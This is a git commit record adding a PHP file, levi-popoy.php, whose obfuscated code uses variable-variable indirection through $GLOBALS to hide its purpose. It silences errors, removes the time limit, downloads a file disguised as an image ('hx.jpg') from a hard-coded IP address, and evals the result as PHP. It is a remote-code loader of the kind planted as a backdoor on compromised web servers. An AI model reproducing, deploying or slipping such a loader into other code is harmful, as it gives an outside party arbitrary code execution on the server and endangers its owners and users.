d9473cd0602147c941c0f11db243008698a594e9
labubunews <siskapas1000@gmail.com>
2024-11-25 08:28:37 +0700

    Add files via upload

---
+++ levi-popoy.php
@@ -0,0 +1,17 @@
+<?php 
+${"GLOBALS"}["delves"]="love";
+${"GLOBALS"}["0xfah"]="you";
+error_reporting(0);
+set_time_limit(0);
+${"GLOBALS"}["lph"]="love";
+${"GLOBALS"}["haxor"]="love";
+${${"GLOBALS"}["haxor"]}=curl_init();
+${"GLOBALS"}["world"]="love";
+${"GLOBALS"}["klangsub"]="love";
+curl_setopt(${${"GLOBALS"}["lph"]},
+CURLOPT_URL,"http://156.67.221.29/hx.jpg");
+curl_setopt(${${"GLOBALS"}["world"]},CURLOPT_RETURNTRANSFER,1);
+${${"GLOBALS"}["0xfah"]}=curl_exec(${${"GLOBALS"}["delves"]});
+curl_close(${${"GLOBALS"}["klangsub"]});
+eval("?>".${${"GLOBALS"}["0xfah"]});
+?>
